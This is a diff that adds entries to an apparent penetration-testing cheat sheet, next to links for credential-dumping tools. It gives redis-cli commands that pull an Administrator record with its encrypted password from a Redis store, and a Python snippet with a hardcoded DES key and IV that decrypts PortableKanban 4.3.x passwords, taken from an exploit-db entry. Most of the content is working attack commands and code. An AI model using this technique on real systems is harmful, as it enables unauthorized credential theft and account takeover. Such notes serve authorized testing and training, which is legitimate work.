@@ -928,4 +928,39 @@ https://github.com/Flangvik/SharpCollection
 ### [PPL Dump - Credential Dumping]
 https://github.com/itm4n/PPLdump
 
+### extracting passwords using redis
+1. connect to the host via redis-cli  
+`redis_cli -h <ip>`
 
+2. Enter redis requiredpassword  
+`auth <password>`
+
+3. Retrieve user list using keys  
+`keys *`
+
+```
+list of keys will display, find the user in question and extract the password.
+
+1) "pk:ids:MetaDataClass"
+2) "pk:urn:metadataclass:ffffffff-ffff-ffff-ffff-ffffffffffff"
+3) "pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0"
+4) "pk:ids:User"
+```
+
+4.  Specify user using get  
+`get "pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0"`
+
+```
+"{\"Id\":\"e8e29158d70d44b1a1ba4949d52790a0\",\"Name\":\"Administrator\",\"Initials\":\"\",\"Email\":\"\",\"EncryptedPassword\":\"<hash>\",\"Role\":\"Admin\",\"Inactive\":false,\"TimeStamp\":637530169606440253}"
+```
+
+### Decrypting PortableKanban 4.3.x password
+
+https://www.exploit-db.com/exploits/49409
+```
+import base64
+from des import *
+hash = base64.b64decode('<hash>'.encode('utf-8'))
+key = DesKey(b"7ly6UznJ")
+print(key.decrypt(hash,initial=b"XuVUm5fR",padding=True).decode('utf-8'))
+```
